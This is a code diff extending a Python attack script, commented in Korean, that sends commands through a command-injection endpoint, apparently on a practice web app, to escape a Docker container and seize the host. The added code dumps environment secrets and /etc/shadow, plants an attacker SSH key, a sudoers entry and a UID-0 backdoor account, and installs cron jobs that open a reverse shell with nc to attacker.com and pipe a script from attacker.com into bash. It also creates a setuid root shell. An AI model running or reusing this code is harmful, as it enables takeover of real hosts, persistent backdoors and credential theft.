@@ -84,6 +84,112 @@ DOCKER_ESCAPE_TECHNIQUES = [
             'cat /host/root/.ssh/id_rsa 2>/dev/null',
         ],
     },
+    {
+        'name': 'Procfs Host Access',
+        'description': '/proc을 통한 호스트 프로세스 정보 접근',
+        'check_command': 'test -d /proc && echo "YES"',
+        'exploit_commands': [
+            # 호스트 프로세스 확인
+            'ps aux | head -20',
+            # 호스트 환경 변수 탈취
+            'cat /proc/1/environ | tr "\\0" "\\n" | head -30',
+            # 호스트 cmdline 확인
+            'cat /proc/1/cmdline',
+            # 호스트 마운트 정보
+            'cat /proc/mounts | grep -v docker | head -20',
+        ],
+    },
+    {
+        'name': 'Cgroup Escape',
+        'description': 'Cgroup을 통한 호스트 명령 실행',
+        'check_command': 'test -w /sys/fs/cgroup 2>/dev/null && echo "YES" || test -r /sys/fs/cgroup && echo "YES"',
+        'exploit_commands': [
+            # cgroup 정보 확인
+            'cat /proc/self/cgroup | head -10',
+            'ls -la /sys/fs/cgroup/ 2>/dev/null',
+            # cgroup 마운트 확인
+            'mount | grep cgroup',
+        ],
+    },
+    {
+        'name': 'Container Capabilities Abuse',
+        'description': '컨테이너 Capabilities를 악용한 권한 상승',
+        'check_command': 'capsh --print 2>/dev/null | grep -q Current && echo "YES" || cat /proc/self/status | grep -q Cap && echo "YES"',
+        'exploit_commands': [
+            # 현재 Capabilities 확인
+            'cat /proc/self/status | grep Cap',
+            'capsh --print 2>/dev/null',
+            # 파일 Capabilities 확인
+            'getcap -r / 2>/dev/null | head -20',
+        ],
+    },
+    {
+        'name': 'Release Agent Exploit',
+        'description': 'cgroup release_agent를 통한 호스트 명령 실행',
+        'check_command': 'test -f /sys/fs/cgroup/memory/release_agent 2>/dev/null && echo "YES" || test -f /sys/fs/cgroup/release_agent 2>/dev/null && echo "YES"',
+        'exploit_commands': [
+            # release_agent 경로 확인
+            'cat /sys/fs/cgroup/release_agent 2>/dev/null',
+            'cat /sys/fs/cgroup/*/release_agent 2>/dev/null | head -5',
+            # notify_on_release 확인
+            'find /sys/fs/cgroup -name notify_on_release 2>/dev/null | head -10',
+        ],
+    },
+    {
+        'name': 'Kernel Exploit',
+        'description': '커널 취약점을 통한 컨테이너 탈출',
+        'check_command': 'uname -a | grep -q Linux && echo "YES"',
+        'exploit_commands': [
+            # 커널 버전 상세 정보
+            'uname -a',
+            'cat /proc/version',
+            # 알려진 취약한 커널 버전 확인
+            'uname -r',
+            # 커널 모듈 확인
+            'lsmod 2>/dev/null | head -20',
+        ],
+    },
+    {
+        'name': 'Volume Mount Exploitation',
+        'description': '마운트된 볼륨을 통한 호스트 접근',
+        'check_command': 'mount | grep -v "docker\\|overlay\\|shm" | grep -q "/" && echo "YES"',
+        'exploit_commands': [
+            # 모든 마운트 확인
+            'mount | grep -v "docker\\|overlay\\|shm"',
+            # 쓰기 가능한 마운트 찾기
+            'df -h | grep -v "overlay\\|tmpfs\\|shm"',
+            # 의심스러운 마운트 탐색
+            'cat /proc/mounts | grep -v "docker\\|overlay" | head -20',
+        ],
+    },
+    {
+        'name': 'Environment Variable Leak',
+        'description': '환경 변수를 통한 민감 정보 탈취',
+        'check_command': 'env | grep -q . && echo "YES"',
+        'exploit_commands': [
+            # 모든 환경 변수 덤프
+            'env',
+            # 민감 정보 패턴 검색
+            'env | grep -i "key\\|pass\\|secret\\|token\\|credential"',
+            # 부모 프로세스 환경 변수
+            'cat /proc/1/environ | tr "\\0" "\\n"',
+        ],
+    },
+    {
+        'name': 'Network Namespace Escape',
+        'description': '네트워크 네임스페이스를 통한 호스트 네트워크 접근',
+        'check_command': 'ip addr 2>/dev/null | grep -q inet && echo "YES" || ifconfig 2>/dev/null | grep -q inet && echo "YES"',
+        'exploit_commands': [
+            # 네트워크 인터페이스 확인
+            'ip addr 2>/dev/null || ifconfig 2>/dev/null',
+            # 라우팅 테이블
+            'ip route 2>/dev/null || route -n 2>/dev/null',
+            # ARP 테이블 (호스트 네트워크 정보)
+            'ip neigh 2>/dev/null || arp -a 2>/dev/null',
+            # 네트워크 연결
+            'netstat -tun 2>/dev/null | head -20',
+        ],
+    },
 ]
 
 def run_attack(session, delay=1):
@@ -105,7 +211,8 @@ def run_attack(session, delay=1):
             'is_container': False,
             'escape_vectors': {},
             'escaped': False,
-            'host_access': []
+            'host_access': [],
+            'root_access': False
         }
     }
 
@@ -116,7 +223,7 @@ def run_attack(session, delay=1):
     cmdi_url = f"{session.base_url}/vulnerabilities/exec/"
 
     # 1단계: Docker 컨테이너 확인
-    print("  [1/3] Docker 컨테이너 여부 확인 중...")
+    print("  [1/4] Docker 컨테이너 여부 확인 중...")
     if not check_docker_container(session, cmdi_url, results, delay):
         print("    [-] Docker 컨테이너가 아닙니다. 탈출 불가능")
         return results
@@ -125,12 +232,16 @@ def run_attack(session, delay=1):
     results['findings']['is_container'] = True
 
     # 2단계: 탈출 벡터 스캔
-    print("\n  [2/3] Docker 탈출 벡터 스캔 중...")
+    print("\n  [2/4] Docker 탈출 벡터 스캔 중...")
     scan_escape_vectors(session, cmdi_url, results, delay)
 
     # 3단계: 실제 탈출 시도
-    print("\n  [3/3] Docker 탈출 시도 중...")
+    print("\n  [3/4] Docker 탈출 시도 중...")
     attempt_container_escape(session, cmdi_url, results, delay)
+
+    # 4단계: 호스트 루트 권한 획득 시도
+    if results['findings']['host_access']:
+        attempt_host_root_access(session, cmdi_url, results, delay)
 
     if results['successful'] > 0:
         results['success'] = True
@@ -345,6 +456,101 @@ def extract_command_output(html_response):
     except Exception:
         return ""
 
+def attempt_host_root_access(session, cmdi_url, results, delay):
+    """탈출 후 호스트 루트 권한 획득 시도"""
+
+    print("\n  [4/4] 호스트 루트 권한 획득 시도 중...")
+
+    # 호스트 접근이 성공한 경우에만 실행
+    if not results['findings']['host_access']:
+        print("    [-] 호스트 접근 불가능, 루트 권한 시도 불가")
+        return
+
+    root_attempts = [
+        {
+            'name': 'chroot를 통한 호스트 쉘 획득',
+            'commands': [
+                'chroot /host /bin/bash -c "whoami"',
+                'chroot /host /bin/bash -c "id"',
+                'chroot /host /bin/bash -c "cat /etc/shadow | head -5"'
+            ]
+        },
+        {
+            'name': 'nsenter를 통한 호스트 네임스페이스 진입',
+            'commands': [
+                'nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash -c "whoami"',
+                'nsenter -t 1 -m -u -i -n -p /bin/bash -c "id"',
+                'nsenter -t 1 -m -u -i -n -p /bin/bash -c "cat /root/.ssh/authorized_keys 2>/dev/null"'
+            ]
+        },
+        {
+            'name': '호스트 파일시스템 직접 조작',
+            'commands': [
+                # SSH 키 추가
+                'echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ... attacker@2sec" >> /host/root/.ssh/authorized_keys 2>/dev/null',
+                # sudoers 수정
+                'echo "www-data ALL=(ALL) NOPASSWD:ALL" >> /host/etc/sudoers 2>/dev/null',
+                # 백도어 계정 생성
+                'chroot /host /bin/bash -c "useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor 2>/dev/null"'
+            ]
+        },
+        {
+            'name': 'Cron을 통한 지속성 확보',
+            'commands': [
+                'echo "* * * * * root /bin/bash -c \"nc -e /bin/bash attacker.com 4444\" 2>/dev/null" >> /host/etc/crontab',
+                'echo "* * * * * root curl http://attacker.com/shell.sh | bash" >> /host/var/spool/cron/crontabs/root 2>/dev/null',
+                'chroot /host /bin/bash -c "service cron reload 2>/dev/null"'
+            ]
+        },
+        {
+            'name': 'SetUID 바이너리 생성',
+            'commands': [
+                'cp /bin/bash /host/tmp/rootshell 2>/dev/null',
+                'chmod 4755 /host/tmp/rootshell 2>/dev/null',
+                'ls -la /host/tmp/rootshell 2>/dev/null'
+            ]
+        }
+    ]
+
+    for attempt in root_attempts:
+        print(f"\n    [*] {attempt['name']} 시도 중...")
+
+        for cmd in attempt['commands']:
+            results['attempts'] += 1
+
+            try:
+                payload = f"127.0.0.1; {cmd}"
+                data = {'ip': payload, 'Submit': 'Submit'}
+                response = session.session.post(cmdi_url, data=data)
+                output = extract_command_output(response.text)
+
+                if output and len(output) > 5:
+                    results['successful'] += 1
+
+                    # 루트 권한 획득 성공 확인
+                    if 'root' in output or 'uid=0' in output:
+                        print(f"        [!!!] 루트 권한 획득 성공!")
+                        results['findings']['root_access'] = True
+                        log_exfiltrated_data(
+                            'ROOT_ACCESS',
+                            cmd,
+                            output,
+                            preview_length=1000
+                        )
+                    elif 'authorized_keys' in cmd and 'ssh-rsa' in output:
+                        print(f"        [!!!] SSH 백도어 설치 성공!")
+                    elif 'rootshell' in output and '4755' in output:
+                        print(f"        [!!!] SetUID 루트쉘 생성 성공!")
+                    else:
+                        print(f"        [+] 명령 실행: {len(output)} bytes")
+
+                    log_command_output(cmd, 'ROOT_ACCESS_ATTEMPT', output)
+
+                time.sleep(delay)
+
+            except Exception as e:
+                log_attack('ROOT_ACCESS_ATTEMPT', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)
+
 def print_docker_escape_summary(results):
     """Docker 탈출 결과 요약 출력"""
     print("\n  [*] ===========================================")
@@ -367,6 +573,10 @@ def print_docker_escape_summary(results):
         if findings['escaped']:
             print(f"\n  [!!!] 컨테이너 탈출: 성공! (호스트 접근 획득)")
             print(f"  [!!!] 호스트 시스템 데이터 탈취 성공!")
+
+            if findings.get('root_access'):
+                print(f"\n  [!!!] 호스트 루트 권한: 획득 성공!")
+                print(f"  [!!!] 시스템 완전 장악!")
         elif findings['host_access']:
             print(f"\n  [+] 호스트 시스템 접근: {len(findings['host_access'])}개 방법 발견")
         else:
